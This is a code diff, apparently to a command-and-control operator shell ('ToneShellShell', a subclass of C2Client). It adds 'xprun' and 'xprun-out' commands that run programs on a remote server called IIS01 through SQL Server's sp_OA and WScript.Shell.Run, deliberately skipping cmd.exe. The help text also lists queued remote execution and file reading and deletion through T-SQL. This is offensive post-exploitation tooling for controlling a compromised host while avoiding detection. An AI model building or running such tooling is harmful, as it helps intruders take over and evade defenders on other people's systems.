@@ -27,6 +27,8 @@ Built-in commands (case-insensitive):
     xpexec <cmd>                    run command via xpagent SB queue, wait for result
     xpexec-bg <cmd>                 fire-and-forget xpexec (returns cmd_id)
     xpout <cmd_id>                  read xpagent output rows by cmd_id
+    xprun <exe_cmd>                 direct PE exec via sp_OA WScript.Shell.Run (no cmd.exe, exit code only)
+    xprun-out <exe_cmd>             xprun + auto -o temp file + xpfile cat output + cleanup
     xpfile exists|del|cat|ls <path> file ops on IIS01 via T-SQL (no cmd spawn)
     help                            show this help
     exit / quit                     exit the shell
@@ -270,6 +272,28 @@ class ToneShellShell(C2Client):
                         print("[!] run xpinit first")
                     else:
                         self._xp.cmd_xpexec_bg(self, rest[1])
+
+                elif cmd == "xprun":
+                    rest = line.split(None, 1)
+                    if not self.session:
+                        print("[!] not attached to a session")
+                    elif len(rest) < 2:
+                        print("usage: xprun <exe_command>")
+                    elif not self._xp.ready():
+                        print("[!] run xpinit first")
+                    else:
+                        self._xp.cmd_xprun(self, rest[1])
+
+                elif cmd == "xprun-out":
+                    rest = line.split(None, 1)
+                    if not self.session:
+                        print("[!] not attached to a session")
+                    elif len(rest) < 2:
+                        print("usage: xprun-out <exe_command>")
+                    elif not self._xp.ready():
+                        print("[!] run xpinit first")
+                    else:
+                        self._xp.cmd_xprun_out(self, rest[1])
 
                 elif cmd == "xpout":
                     if not self.session:
